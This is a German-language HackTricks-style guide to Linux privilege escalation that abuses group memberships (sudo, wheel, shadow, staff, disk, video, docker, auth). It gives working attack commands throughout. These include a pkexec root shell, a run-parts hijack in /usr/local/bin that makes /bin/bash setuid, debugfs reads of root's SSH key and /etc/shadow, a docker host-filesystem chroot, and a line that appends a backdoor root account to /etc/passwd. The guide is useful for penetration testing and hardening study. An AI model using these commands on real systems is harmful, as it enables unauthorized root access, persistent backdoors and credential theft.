# Interessante Gruppen - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Gruppen

### **PE - Method 1**

**Manchmal**, **standardmäßig (oder weil einige Software es benötigt)** kann man in der Datei **/etc/sudoers** einige dieser Zeilen finden:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe sudo oder admin gehört, alles mit sudo ausführen kann**.

Wenn dies der Fall ist, um **root zu werden, kannst du einfach ausführen**:
```
sudo su
```
### PE - Methode 2

Finde alle suid binaries und prüfe, ob die binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Wenn du feststellst, dass die Binärdatei **pkexec is a SUID binary** ist und du zur Gruppe **sudo** oder **admin** gehörst, könntest du wahrscheinlich Binärdateien als sudo mit `pkexec` ausführen.\
Das liegt daran, dass dies typischerweise die Gruppen innerhalb der **polkit policy** sind. Diese Richtlinie identifiziert im Grunde, welche Gruppen `pkexec` verwenden können. Prüfe es mit:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Dort findest du, welche Gruppen berechtigt sind, **pkexec** auszuführen, und **standardmäßig** erscheinen in einigen Linux-Distributionen die Gruppen **sudo** und **admin**.

Um **root zu werden, kannst du ausführen**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Wenn Sie versuchen, **pkexec** auszuführen und diese **Fehlermeldung** erhalten:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Es liegt nicht daran, dass du keine Berechtigungen hast, sondern daran, dass du nicht mit einer GUI verbunden bist**. Und es gibt eine Lösung für dieses Problem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Du benötigst **2 verschiedene ssh-Sitzungen**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel-Gruppe

**Manchmal**, **standardmäßig** findet man in der Datei **/etc/sudoers** diese Zeile:
```
%wheel	ALL=(ALL:ALL) ALL
```
Das bedeutet, dass **jeder Benutzer, der zur Gruppe wheel gehört, alles mit sudo ausführen kann**.

Wenn dies der Fall ist, um **root zu werden, kannst du einfach folgendes ausführen**:
```
sudo su
```
## Shadow-Gruppe

Benutzer aus der **group shadow** können die **/etc/shadow**-Datei **lesen**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Lies die Datei und versuche, **crack some hashes**.

Kurzer Hinweis zum Lock-Status beim triaging von hashes:
- Einträge mit `!` oder `*` sind in der Regel nicht interaktiv für Passwort-Anmeldungen.
- `!hash` bedeutet normalerweise, dass ein Passwort gesetzt und anschließend gesperrt wurde.
- `*` bedeutet normalerweise, dass nie ein gültiger Passwort-Hash gesetzt wurde.
Das ist nützlich zur Klassifizierung von Benutzerkonten, selbst wenn die direkte Anmeldung blockiert ist.

## Staff-Gruppe

**staff**: Ermöglicht Benutzern, lokale Änderungen am System (`/usr/local`) vorzunehmen, ohne root-Privilegien zu benötigen (beachte, dass ausführbare Dateien in `/usr/local/bin` in der PATH-Variable jedes Benutzers enthalten sind, und sie die ausführbaren Dateien in `/bin` und `/usr/bin` mit demselben Namen "override" können). Vergleiche mit der Gruppe "adm", die eher mit Überwachung/Sicherheit zu tun hat. [\[source\]](https://wiki.debian.org/SystemGroups)

In Debian-Distributionen zeigt die `$PATH`-Variable, dass `/usr/local/` mit der höchsten Priorität ausgeführt wird, egal ob man ein privilegierter Benutzer ist oder nicht.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Wenn wir einige Programme in `/usr/local` hijacken können, können wir leicht root bekommen.

Hijack des `run-parts`-Programms ist ein einfacher Weg, um root zu bekommen, weil die meisten Programme ein `run-parts` ausführen (z. B. crontab oder beim ssh-Login).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
oder bei der Anmeldung einer neuen ssh-Sitzung.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk-Gruppe

Dieses Privileg ist nahezu **gleichbedeutend mit root access**, da Sie auf alle Daten auf dem System zugreifen können.

Dateien:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Beachte, dass man mit debugfs auch **Dateien schreiben** kann. Zum Beispiel, um `/tmp/asd1.txt` nach `/tmp/asd2.txt` zu kopieren, kann man Folgendes tun:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Wenn du jedoch versuchst, **Dateien zu schreiben, die root gehören** (wie `/etc/shadow` oder `/etc/passwd`), erhältst du eine "**Permission denied**" Fehlermeldung.

## Video-Gruppe

Mit dem Befehl `w` kannst du herausfinden, **wer am System angemeldet ist**, und er zeigt eine Ausgabe wie die folgende:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Das **tty1** bedeutet, dass der Benutzer **yossi physisch an einem Terminal** auf der Maschine angemeldet ist.

Die **video group** hat Zugriff, die Bildschirmausgabe zu betrachten. Im Grunde kannst du die Bildschirme beobachten. Dazu musst du das **aktuelle Bild auf dem Bildschirm erfassen** als Rohdaten und die vom Bildschirm verwendete Auflösung ermitteln. Die Bildschirmdaten können in `/dev/fb0` gespeichert werden und die Auflösung dieses Bildschirms findest du in `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Um die **raw image** zu **öffnen** kannst du **GIMP** verwenden, die **`screen.raw`** Datei auswählen und als Dateityp **Raw image data** wählen:

![](<../../../images/image (463).png>)

Dann ändere die Width und Height auf die auf dem Bildschirm verwendeten Werte und probiere verschiedene Image Types aus (wähle den Typ, der das Bild am besten darstellt):

![](<../../../images/image (317).png>)

## Root-Gruppe

Es scheint, dass standardmäßig **Mitglieder der Root-Gruppe** Zugriff haben könnten, einige **Service**-Konfigurationsdateien oder einige **Bibliotheksdateien** oder **andere interessante Dinge** zu **modifizieren**, die zur Eskalation von Rechten genutzt werden könnten...

**Überprüfe, welche Dateien Root-Mitglieder modifizieren können**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Du kannst **das root filesystem der Host-Maschine auf das Volume einer Instanz mounten**, sodass beim Start der Instanz sofort ein `chroot` in dieses Volume geladen wird. Das verschafft dir effektiv root auf der Maschine.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Falls Ihnen keiner der vorherigen Vorschläge zusagt oder sie aus irgendeinem Grund nicht funktionieren (docker api firewall?), können Sie immer versuchen, einen **privileged container zu starten und daraus zu escape**, wie hier erklärt:


{{#ref}}
../container-security/
{{#endref}}

Wenn Sie Schreibrechte auf den docker socket haben, lesen Sie [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Gruppe


{{#ref}}
./
{{#endref}}

## Adm Gruppe

Normalerweise haben **Mitglieder** der Gruppe **`adm`** die Berechtigung, **Logdateien** im Verzeichnis _/var/log/_ zu **lesen**.\
Daher sollten Sie, wenn Sie einen Benutzer in dieser Gruppe kompromittiert haben, unbedingt einen **Blick in die Logs** werfen.

## Backup / Operator / lp / Mail Gruppen

Diese Gruppen sind häufig Vektoren für **credential-discovery** und weniger direkte Root-Vektoren:
- **backup**: kann Archive mit Konfigurationen, Schlüsseln, DB-Dumps oder Tokens offenlegen.
- **operator**: plattformspezifischer Betriebszugang, der sensitive Laufzeitdaten leak kann.
- **lp**: Druckwarteschlangen/-spools können Dokumentinhalte enthalten.
- **mail**: Mail-Spools können Reset-Links, OTPs und interne Zugangsdaten offenlegen.

Betrachten Sie die Mitgliedschaft hier als einen hochkarätigen Befund zur Datenexposition und pivoten Sie über Passwort-/Token-Wiederverwendung.

## Auth Gruppe

Unter OpenBSD kann die **auth**-Gruppe normalerweise in die Verzeichnisse _**/etc/skey**_ und _**/var/db/yubikey**_ schreiben, falls diese verwendet werden.\
Diese Berechtigungen können mit folgendem Exploit missbraucht werden, um **escalate privileges** zu root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
